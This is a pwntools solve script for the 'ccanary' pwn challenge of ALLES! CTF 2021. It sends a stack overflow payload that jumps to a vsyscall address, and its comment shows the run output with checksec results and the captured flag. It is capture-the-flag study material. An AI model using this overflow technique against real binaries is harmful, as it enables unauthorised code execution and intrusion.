from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './ccanary'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  s = process("ncat --ssl 7b0000007c7be7ad4dab5be5-ccanary.challenge.master.allesctf.net 31337", shell=True)
else:
  s = process(BINARY)
 
s.recvuntil("quote> ")

buf  = "A"*(0x1f)
buf += p64(0xffffffffff600400)  # sys_time
buf += p64(1)
s.sendline(buf)

s.interactive()

'''
mito@ubuntu:~/CTF/ALLES!_CTF_2021/Pwn_ccanary$ python solve.py r
[*] '/home/mito/CTF/ALLES!_CTF_2021/Pwn_ccanary/ccanary'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process '/bin/sh': pid 60051
[*] Switching to interactive mode
good birb!

"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Here's the flag:
ALLES!{th1s_m1ght_n0t_work_on_y0ur_syst3m_:^)}
'''
